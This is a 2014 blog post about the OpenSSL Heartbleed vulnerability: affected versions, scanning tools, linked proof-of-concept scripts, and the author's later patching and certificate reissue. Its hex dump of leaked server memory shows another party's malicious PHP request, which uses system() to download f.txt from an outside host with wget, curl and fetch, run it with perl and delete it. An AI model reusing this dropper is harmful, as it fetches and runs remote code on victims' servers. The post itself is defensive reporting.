---
layout: post
title: "1f j00 R R34d1N 7h12 m3m0ry j00 R pWN3D"
date: 2014-04-10 12:05:03 -0500
comments: false
categories:
- Networking
- Security
- Programming
- SSL
- ISP
image:
  feature: https://ciscodude.net/images/snow-dust.jpg
  credit: Theo Baschak
  creditlink: https://www.flickr.com/photos/theodorebaschak/
---
Another huge blunder this week in the ubiquitous OpenSSL library [secadv](https://www.openssl.org/news/secadv_20140407.txt). This one's called [Heartbleed](http://heartbleed.com/). You can easily check if your services are vulnerable at [filippo.io/Heartbleed](http://filippo.io/Heartbleed/). This one is particularly scary as it allows reading random private memory directly from the server/device/etc. This may include decrypted SSL transactions, certs, private keys, and other random memory. So far I have only seen other SSL requests, and public certificate chains from my own devices.

XKCD has a comic which [explains Heartbleed](http://xkcd.com/1354/) VERY well.

The implications are huge. Luckily it only affects OpenSSL 1.0.1 to 1.0.1f (and some beta 1.0.2 versions.. but you'd never run beta in production right?). 1.0.1g is not affected. Older versions are OK here as well. So my recent push for [Upgraded SSL Ciphers](/2014/01/12/ssl-ciphers/) bit me in the ass. Some of the various devices affected are included in this [advisory from NSCS-FI](https://www.cert.fi/en/reports/2014/vulnerability788210.html). There are a lot of devices which use OpenSSL. There are many, many Linux/BSD distributions which shipped vulnerable OpenSSL packages/libs as well. Again, like the other SSL problems earlier this year, there will be implications from this for a long time because all sorts of embedded systems and devices won't get updated (potentially ever).

If you need to mass-scan your network(s), nmap has a [script for that](https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse) [docs here](http://nmap.org/nsedoc/scripts/ssl-heartbleed.html).

Here is an interesting chunk of memory pulled from a vulnerable firewall using one of several [widely](https://ccdn.tracetracker.com/ssltest.py) [available](https://gist.github.com/siboulet/10154829) [ssltest.py](https://github.com/musalbas/heartbleed-masstest/blob/master/ssltest.py) POCs. This is someone elses encrypted request body. Someone, or more likely something pretending to be a Googlebot, and sending a php file attachment with some badness in it. I would not recommend running the below hex decoded PHP code in the request, nor downloading the f.txt (and especially not executing it), unless you are a malware researcher.

{% highlight text %}
  0200: 70 61 74 69 62 6C 65 3B 20 47 6F 6F 67 6C 65 62  patible; Googleb
  0210: 6F 74 2F 32 2E 31 3B 20 2B 68 74 74 70 3A 2F 2F  ot/2.1; +http://
  0220: 77 77 77 2E 67 6F 6F 67 6C 65 2E 63 6F 6D 2F 62  www.google.com/b
  0230: 6F 74 2E 68 74 6D 6C 29 0D 0A 43 6F 6E 74 65 6E  ot.html)..Conten
  0240: 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74  t-Type: applicat
  0250: 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F 72 6D 2D 75  ion/x-www-form-u
  0260: 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 6F 6E 74 65  rlencoded..Conte
  0270: 6E 74 2D 4C 65 6E 67 74 68 3A 20 32 35 31 0D 0A  nt-Length: 251..
  0280: 0D 0A 3C 3F 70 68 70 20 65 63 68 6F 20 22 43 6F  ..<?php echo "Co
  0290: 6E 74 65 6E 74 2D 54 79 70 65 3A 74 65 78 74 2F  ntent-Type:text/
  02a0: 68 74 6D 6C 5C 72 5C 6E 5C 72 5C 6E 22 3B 65 63  html\r\n\r\n";ec
  02b0: 68 6F 20 22 62 75 6E 34 22 2E 70 68 70 5F 75 6E  ho "bun4".php_un
  02c0: 61 6D 65 28 29 2E 22 73 74 30 70 22 3B 73 79 73  ame()."st0p";sys
  02d0: 74 65 6D 28 22 63 64 20 2F 74 6D 70 3B 77 67 65  tem("cd /tmp;wge
  02e0: 74 20 77 67 65 74 20 68 74 74 70 3A 2F 2F 77 77  t wget http://ww
  02f0: 77 2E 63 6F 72 64 6F 62 79 74 65 2E 63 6F 6D 2F  w.cordobyte.com/
  0300: 66 2E 74 78 74 3B 63 75 72 6C 20 2D 4F 20 68 74  f.txt;curl -O ht
  0310: 74 70 3A 2F 2F 77 77 77 2E 63 6F 72 64 6F 62 79  tp://www.cordoby
  0320: 74 65 2E 63 6F 6D 2F 66 2E 74 78 74 3B 66 65 74  te.com/f.txt;fet
  0330: 63 68 20 68 74 74 70 3A 2F 2F 77 77 77 2E 63 6F  ch http://www.co
  0340: 72 64 6F 62 79 74 65 2E 63 6F 6D 2F 66 2E 74 78  rdobyte.com/f.tx
  0350: 74 3B 70 65 72 6C 20 66 2E 74 78 74 3B 70 65 72  t;perl f.txt;per
  0360: 6C 20 66 2E 74 78 74 3B 72 6D 20 2D 72 66 20 66  l f.txt;rm -rf f
  0370: 2E 2A 22 29 3B 65 78 69 74 3B 20 3F 3E 87 5C 06  .*");exit; ?>.\.
  0380: 85 8C 9C E2 46 93 40 CF 62 D0 F7 E7 B4 4A AB 3A  ....F.@.b....J.:
  0390: 80 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E 0E  ................
{% endhighlight %}

**Update several days later**:

So the majority of the pain is over. Systems are patched and updated. Passwords changed. Certificates reissued (this was surprisingly easy!) and re-installed on various devices. Luckily for my usage, all of my OpenSSL 1.0.1 systems had PFS enabled, so private data should be private.
